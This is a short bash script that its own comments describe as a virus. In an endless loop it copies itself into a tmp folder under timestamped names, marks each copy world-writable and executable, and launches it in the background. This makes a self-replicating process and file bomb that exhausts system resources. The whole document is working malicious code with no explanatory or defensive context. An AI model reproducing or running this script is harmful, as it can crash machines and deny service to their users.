#!/bin/bash

while ((1>0)); do
	mkdir -p tmp				#make folder tmp if not exists
	newName=$(date +%s%N)		#generate a name by time
	cat ./$0 > ./tmp/$newName	#copy the virus to tmp with generated name
	chmod 777 ./tmp/$newName	#allow new copy to run
	sleep 5s					#wait 5 secs
	cd ./tmp 					#change directory to tmp
	./$newName &				#run new virus is new proccess
	cd ../						#go back to directory
	sleep 5s					#sleep 5 secs
done

